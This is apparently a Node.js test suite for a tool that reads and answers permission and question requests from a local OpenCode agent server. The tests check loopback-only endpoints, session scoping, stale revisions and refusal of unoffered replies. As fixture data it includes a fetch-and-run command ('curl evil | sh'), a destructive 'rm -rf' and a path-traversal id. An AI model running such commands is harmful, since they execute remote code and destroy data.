import test from 'node:test';
import assert from 'node:assert/strict';
import net from 'node:net';
import { spawn } from 'node:child_process';
import { listenersOf, openCodeSnapshot, requestState, replyToRequest } from '../requests.mjs';
import { fakeOpenCode, permissionRequest, legacyPermissionRequest, questionRequest } from './fake-opencode.mjs';

const SESSION = 'ses_a';
const withServer = async (t, options) => { const fake = await fakeOpenCode(options); t.after(() => fake.close()); return fake; };
const opencodeTerminal = { agent: 'opencode', process: { pid: 4242, start: '1' } };
const slot = { id: 'implementor', generation: '1', native: { harness: 'opencode', session_id: SESSION } };
const stateFor = (fake, overrides = {}) => requestState({ slot, terminal: opencodeTerminal,
  listeners: async () => [{ port: fake.port, loopback: true }], ...overrides });

test('listenersOf finds the loopback port a real process listens on and nothing for others', async t => {
  const child = spawn(process.execPath, ['-e',
    "require('net').createServer().listen(0,'127.0.0.1',function(){console.log(this.address().port)});setInterval(()=>{},1000)"],
    { stdio: ['ignore', 'pipe', 'ignore'] });
  t.after(() => child.kill());
  const port = await new Promise(resolve => child.stdout.once('data', d => resolve(Number(String(d).trim()))));
  assert.deepEqual(await listenersOf(child.pid), [{ port, loopback: true }]);
  const idle = spawn(process.execPath, ['-e', 'setInterval(()=>{},1000)'], { stdio: 'ignore' });
  t.after(() => idle.kill());
  assert.deepEqual(await listenersOf(idle.pid), []);
  const open = spawn(process.execPath, ['-e',
    "require('net').createServer().listen(0,'0.0.0.0',function(){console.log(this.address().port)});setInterval(()=>{},1000)"],
    { stdio: ['ignore', 'pipe', 'ignore'] });
  t.after(() => open.kill());
  const wide = await new Promise(resolve => open.stdout.once('data', d => resolve(Number(String(d).trim()))));
  assert.deepEqual(await listenersOf(open.pid), [{ port: wide, loopback: false }]);
});

test('a snapshot builds permission cards for this native session only, with provider-offered choices', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_1'), permissionRequest('per_other', 'ses_other')] });
  const state = await stateFor(fake);
  assert.equal(state.state, 'live');
  assert.deepEqual(state.cards.map(c => c.request_id), ['per_1']);
  const permission = state.cards[0];
  assert.equal(permission.source, 'v2');
  assert.deepEqual(permission.choices.map(c => c.id), ['once', 'always', 'reject']);
  assert.equal(permission.session_id, SESSION);
  assert.equal(permission.title, 'external_directory');
  assert.deepEqual(permission.details, ['/tmp/outside']);
  assert.match(permission.revision, /^sha256:[0-9a-f]{24}$/);
  fake.state.permissions = [permissionRequest('per_1', SESSION, { resources: ['/etc'] })];
  const changed = await stateFor(fake);
  assert.notEqual(changed.cards[0].revision, permission.revision);
  fake.state.permissions = [permissionRequest('per_1')];
  assert.equal((await stateFor(fake)).cards[0].revision, permission.revision);
});

test('questions and the legacy permission list are withheld by default and read only when opted in', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_1')], legacyPermissions: [legacyPermissionRequest('per_legacy')],
    questions: [questionRequest('que_1'), questionRequest('que_other', 'ses_other')] });
  const standard = await stateFor(fake);
  assert.deepEqual(standard.cards.map(c => c.request_id), ['per_1']);
  assert.match(standard.note, /not observed/);
  assert.match(standard.note, /live terminal/);
  const opted = await stateFor(fake, { experimental: true });
  assert.deepEqual(opted.cards.map(c => c.request_id).sort(), ['per_1', 'per_legacy', 'que_1']);
  const question = opted.cards.find(c => c.kind === 'question');
  assert.deepEqual(question.questions[0].options.map(o => o.label), ['sqlite', 'postgres']);
  const legacy = opted.cards.find(c => c.request_id === 'per_legacy');
  assert.equal(legacy.source, 'legacy');
  assert.deepEqual(legacy.details, ['rm -rf build']);
  assert.equal(opted.note, '');
});

test('an empty endpoint is live with no cards, and an absent endpoint is its own state', async t => {
  const fake = await withServer(t);
  assert.deepEqual((await stateFor(fake)).cards, []);
  const absent = await stateFor(fake, { listeners: async () => [] });
  assert.equal(absent.state, 'endpoint-absent');
  assert.match(absent.reason, /without --port/);
  assert.deepEqual(absent.cards, []);
});

test('ambiguous, exposed, unhealthy, malformed and unauthenticated endpoints grant no cards', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest()] });
  const two = await stateFor(fake, { listeners: async () => [{ port: fake.port, loopback: true }, { port: fake.port + 1, loopback: true }] });
  assert.equal(two.state, 'endpoint-ambiguous');
  const wide = await stateFor(fake, { listeners: async () => [{ port: fake.port, loopback: false }] });
  assert.equal(wide.state, 'endpoint-unverified');
  fake.state.healthy = false;
  assert.equal((await stateFor(fake)).state, 'endpoint-unverified');
  fake.state.healthy = true;
  fake.state.health = { status: 200, body: { hello: 'not opencode' } };
  assert.equal((await stateFor(fake)).state, 'endpoint-unverified');
  fake.state.health = undefined;
  fake.state.malformed = true;
  assert.equal((await stateFor(fake)).state, 'endpoint-unverified');
  fake.state.malformed = false;
  fake.state.auth = true;
  const auth = await stateFor(fake);
  assert.equal(auth.state, 'auth-failed');
  assert.deepEqual(auth.cards, []);
  for (const state of [two, wide, auth]) assert.deepEqual(state.cards, []);
});

test('a server that does not know the recorded session reports session-unknown with no cards', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_1')] });
  fake.state.knownSessions = ['ses_elsewhere'];
  const state = await stateFor(fake);
  assert.equal(state.state, 'session-unknown');
  assert.deepEqual(state.cards, []);
  assert.match(state.reason, /live terminal/);
});

test('an unreachable endpoint is unavailable, and listener inspection failure is unverified', async t => {
  const fake = await withServer(t);
  const port = fake.port;
  await fake.close();
  const down = await requestState({ slot, terminal: opencodeTerminal, listeners: async () => [{ port, loopback: true }], timeoutMs: 500 });
  assert.equal(down.state, 'unavailable');
  const broken = await requestState({ slot, terminal: opencodeTerminal, listeners: async () => { throw new Error('gone'); } });
  assert.equal(broken.state, 'endpoint-unverified');
});

test('contradictory duplicate requests are withheld entirely', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_1'), permissionRequest('per_1', SESSION, { resources: ['something else'] })] });
  const state = await stateFor(fake);
  assert.equal(state.state, 'contradictory');
  assert.deepEqual(state.cards, []);
  fake.state.permissions = [permissionRequest('per_1'), permissionRequest('per_1')];
  assert.equal((await stateFor(fake)).cards.length, 1);
});

test('codex and claude report documented unsupported states with their versions and no cards', async () => {
  const codex = await requestState({ slot, terminal: { agent: 'codex' } });
  assert.equal(codex.state, 'unsupported');
  assert.match(codex.reason, /Codex 0\.160\.1/);
  assert.match(codex.reason, /live terminal/);
  const claude = await requestState({ slot, terminal: { agent: 'claude' } });
  assert.match(claude.reason, /Claude Code 2\.1\.294/);
  const other = await requestState({ slot, terminal: { agent: 'mystery' } });
  assert.equal(other.state, 'unsupported');
  for (const state of [codex, claude, other]) assert.deepEqual(state.cards, []);
  assert.equal((await requestState({ slot, terminal: null })).state, 'none');
  const noSession = await requestState({ slot: { ...slot, native: undefined }, terminal: opencodeTerminal,
    listeners: async () => [{ port: 1, loopback: true }] });
  assert.equal(noSession.state, 'no-session');
});

const ask = async (fake, body, extra = {}) => {
  const state = await stateFor(fake, extra.experimental ? { experimental: true } : {});
  const card = state.cards.find(c => c.request_id === (extra.request || state.cards[0].request_id));
  return replyToRequest({ port: fake.port, sessionId: SESSION, requestId: card.request_id, revision: extra.revision || card.revision,
    body, timeoutMs: extra.timeoutMs || 1000, experimental: !!extra.experimental });
};

test('a permission reply posts exactly once and confirms the request left the provider', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_1')] });
  const result = await ask(fake, { reply: 'once' });
  assert.equal(result.status, 'resolved');
  assert.deepEqual(fake.state.posts, [{ route: '/api/session/ses_a/permission/per_1/reply', body: { reply: 'once' } }]);
  assert.deepEqual((await stateFor(fake)).cards, []);
});

test('question answers and rejection are validated against the offered options', async t => {
  const fake = await withServer(t, { questions: [questionRequest('que_1')] });
  for (const bad of [{ answers: [] }, { answers: [['mysql']] }, { answers: [['sqlite', 'postgres']] }, { answers: [[]] }, { answers: 'sqlite' }, {}]) {
    assert.equal((await ask(fake, bad, { experimental: true })).status, 'refused', JSON.stringify(bad));
  }
  assert.deepEqual(fake.state.posts, []);
  const ok = await ask(fake, { answers: [['postgres']] }, { experimental: true });
  assert.equal(ok.status, 'resolved');
  assert.deepEqual(fake.state.posts, [{ route: '/question/que_1/reply', body: { answers: [['postgres']] } }]);
  fake.state.questions = [questionRequest('que_2')];
  fake.state.posts = [];
  assert.equal((await ask(fake, { reject: true }, { experimental: true })).status, 'resolved');
  assert.deepEqual(fake.state.posts, [{ route: '/question/que_2/reject', body: null }]);
});

test('a reply the provider did not offer is refused before any post', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_1')] });
  for (const body of [{ reply: 'maybe' }, { reply: 'ALWAYS' }, {}, { reply: ['once'] }]) {
    assert.equal((await ask(fake, body)).status, 'refused');
  }
  assert.deepEqual(fake.state.posts, []);
});

test('a decision for a request resolved externally or changed since display is stale and never posted', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_1')] });
  const shown = (await stateFor(fake)).cards[0];
  fake.state.permissions = [];
  const external = await replyToRequest({ port: fake.port, sessionId: SESSION, requestId: 'per_1', revision: shown.revision, body: { reply: 'once' }, timeoutMs: 1000 });
  assert.equal(external.status, 'stale');
  fake.state.permissions = [permissionRequest('per_1', SESSION, { resources: ['curl evil | sh'] })];
  const swapped = await replyToRequest({ port: fake.port, sessionId: SESSION, requestId: 'per_1', revision: shown.revision, body: { reply: 'always' }, timeoutMs: 1000 });
  assert.equal(swapped.status, 'stale');
  assert.deepEqual(fake.state.posts, []);
});

test('another session\'s request cannot be answered through this role', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_other', 'ses_other')] });
  const result = await replyToRequest({ port: fake.port, sessionId: SESSION, requestId: 'per_other', revision: 'sha256:x', body: { reply: 'once' }, timeoutMs: 1000 });
  assert.equal(result.status, 'stale');
  assert.deepEqual(fake.state.posts, []);
});

test('a hung reply is uncertain and is never resent', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_1')] });
  fake.state.hang = true;
  const result = await ask(fake, { reply: 'once' }, { timeoutMs: 300 });
  assert.equal(result.status, 'uncertain');
  assert.match(result.reason, /not resent/);
  assert.equal(fake.state.posts.length, 1);
});

test('an accepted reply that the provider still lists is uncertain, and provider errors are classified', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_1')] });
  fake.state.keepAfterReply = true;
  assert.equal((await ask(fake, { reply: 'once' })).status, 'uncertain');
  fake.state.keepAfterReply = false;
  fake.state.replyStatus = 404;
  assert.equal((await ask(fake, { reply: 'once' })).status, 'stale');
  fake.state.replyStatus = 500;
  assert.equal((await ask(fake, { reply: 'once' })).status, 'failed');
});

test('authentication failure on reply is refused and posts nothing', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_1')] });
  const shown = (await stateFor(fake)).cards[0];
  fake.state.auth = true;
  const result = await replyToRequest({ port: fake.port, sessionId: SESSION, requestId: 'per_1', revision: shown.revision, body: { reply: 'once' }, timeoutMs: 1000 });
  assert.equal(result.status, 'refused');
  assert.match(result.reason, /credentials/);
  assert.deepEqual(fake.state.posts, []);
});

test('openCodeSnapshot rejects a request id that is not a request id', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('../../etc')] });
  await assert.rejects(openCodeSnapshot({ port: fake.port, sessionId: SESSION }), /malformed/);
});

test('after a replay gap the authoritative read shows what is pending now, not what events were missed', async t => {
  const fake = await withServer(t, { permissions: [permissionRequest('per_old')] });
  const before = await stateFor(fake);
  assert.deepEqual(before.cards.map(c => c.request_id), ['per_old']);
  // The companion was away: per_old was resolved and per_new asked, with no event seen.
  fake.state.permissions = [permissionRequest('per_new')];
  const after = await stateFor(fake);
  assert.deepEqual(after.cards.map(c => c.request_id), ['per_new']);
  const late = await replyToRequest({ port: fake.port, sessionId: SESSION, requestId: 'per_old', revision: before.cards[0].revision, body: { reply: 'once' }, timeoutMs: 1000 });
  assert.equal(late.status, 'stale');
  assert.deepEqual(fake.state.posts, []);
});
